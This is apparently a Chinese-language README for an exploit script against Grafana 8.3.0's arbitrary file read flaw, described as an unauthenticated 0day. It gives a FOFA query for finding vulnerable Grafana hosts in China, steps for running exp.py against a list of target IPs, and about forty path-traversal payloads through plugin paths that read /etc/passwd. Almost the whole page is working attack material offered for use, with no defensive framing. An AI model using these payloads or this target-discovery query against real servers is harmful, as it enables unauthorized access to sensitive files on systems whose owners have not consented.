### Grafana V8.3.0任意文件读取EXP

## 漏洞描述

Grafana是一个开源的度量分析与可视化套件。经常被用作基础设施的时间序列数据和应用程序分析的可视化，它在其他领域也被广泛的使用包括工业传感器、家庭自动化、天气和过程控制等。其 8.3.0版本任意文件读取漏洞，该漏洞目前为0day漏洞，未授权的攻击者利用该漏洞，能够获取服务器敏感文件。

## FOFA监测语法

app="Grafana" && country="CN" && body="v8.3.0"

## 使用方法

```
1.将准备检测的IP地址放入ip.txt文件中
2.运行python3 exp.py
```

![image-20211207220121473](/Users/qiuan/Library/Application Support/typora-user-images/image-20211207220121473.png)

## PAYLOAD

```
/public/plugins/alertlist/../../../../../../../../etc/passwd
/public/plugins/annolist/../../../../../../../../etc/passwd
/public/plugins/barchart/../../../../../../../../etc/passwd
/public/plugins/cloudwatch/../../../../../../../../etc/passwd
/public/plugins/dashlist/../../../../../../../../etc/passwd
/public/plugins/elasticsearch/../../../../../../../../etc/passwd
/public/plugins/graph/../../../../../../../../etc/passwd
/public/plugins/graphite/../../../../../../../../etc/passwd
/public/plugins/heatmap/../../../../../../../../etc/passwd
/public/plugins/influxdb/../../../../../../../../etc/passwd
/public/plugins/mysql/../../../../../../../../etc/passwd
/public/plugins/opentsdb/../../../../../../../../etc/passwd
/public/plugins/pluginlist/../../../../../../../../etc/passwd
/public/plugins/postgres/../../../../../../../../etc/passwd
/public/plugins/prometheus/../../../../../../../../etc/passwd
/public/plugins/stackdriver/../../../../../../../../etc/passwd
/public/plugins/table/../../../../../../../../etc/passwd
/public/plugins/text/../../../../../../../../etc/passwd
/public/plugins/grafana-azure-monitor-datasource/../../../../../../../../etc/passwd
/public/plugins/bargauge/../../../../../../../../etc/passwd
/public/plugins/gauge/../../../../../../../../etc/passwd
/public/plugins/geomap/../../../../../../../../etc/passwd
/public/plugins/gettingstarted/../../../../../../../../etc/passwd
/public/plugins/histogram/../../../../../../../../etc/passwd
/public/plugins/jaeger/../../../../../../../../etc/passwd
/public/plugins/logs/../../../../../../../../etc/passwd
/public/plugins/loki/../../../../../../../../etc/passwd
/public/plugins/mssql/../../../../../../../../etc/passwd
/public/plugins/news/../../../../../../../../etc/passwd
/public/plugins/nodeGraph/../../../../../../../../etc/passwd
/public/plugins/piechart/../../../../../../../../etc/passwd
/public/plugins/stat/../../../../../../../../etc/passwd
/public/plugins/state-timeline/../../../../../../../../etc/passwd
/public/plugins/status-history/../../../../../../../../etc/passwd
/public/plugins/table-old/../../../../../../../../etc/passwd
/public/plugins/tempo/../../../../../../../../etc/passwd
/public/plugins/testdata/../../../../../../../../etc/passwd
/public/plugins/timeseries/../../../../../../../../etc/passwd
/public/plugins/welcome/../../../../../../../../etc/passwd
/public/plugins/zipkin/../../../../../../../../etc/passwd
```

![image-20211207220417265](/Users/qiuan/Library/Application Support/typora-user-images/image-20211207220417265.png)
